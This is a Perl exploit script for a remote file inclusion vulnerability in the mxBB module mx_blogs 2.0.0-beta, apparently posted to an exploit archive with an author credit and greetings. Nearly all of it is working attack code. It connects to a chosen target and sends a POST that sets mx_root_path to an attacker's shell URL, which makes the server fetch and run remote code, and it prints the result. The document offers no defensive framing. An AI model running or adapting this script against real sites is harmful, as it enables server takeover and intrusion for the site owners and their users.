# mxBB Module mx_blogs 2.0.0-beta Remote File Include Exploit
#
# Vendor: http://www.mx-system.com
#
# Download: 
http://www.mx-system.com/index.php?page=4&action=file&file_id=405
#
# Vulncode in: /includes/functions_weblog.php line 24
#
# Greetz: str0ke, TheJT, rgod, Vallani, DNX, NBBN

use Getopt::Long;
use URI::Escape;
use IO::Socket;

$shellcode = "Insert the url to shell here";

main();

sub usage
{
print "\mxBB Module mx_blogs 2.0.0-beta Remote File Include Expl\n";
print "by bd0rk <www.soh-crew.it.tt>\n";
print "-t, --ttarget\t(someone.com)\n";
print "-f, --tshell\t(url to your shellcode)\n";
print "-d, --dir\t(/mx_blogs)\n";
exit;
}

sub main
{
GetOptions ('t|target=s' => \$target,'f|shell=s' => \$shell,'d|dir=s' => 
\$dir);
usage() unless $target;
$shellcode = $shell unless !$shell;
$url = uri_escape($shellcode);

$sock = 
IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$target",PeerPort=>"80") 
or die "\nConnection() failed.\n";

print "\nConnected to ".$target.", injecting shellcode.\n";
$sendurl = "mx_root_path=".$url."";
$sendlen = length($sendurl);
print $sock "POST ".$dir."/includes/functions_weblog.php? HTTP/1.1\n";
print $sock "Host: ".$target."\n";
print $sock "Connection: close\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "Content-Length: ".$sendlen."\n\n";
print $sock $sendurl;
print "Attempted to include shellcode, Response:\n\n";
while($recvd = <$sock>)
{
print " ".$recvd."";
}
exit;
}

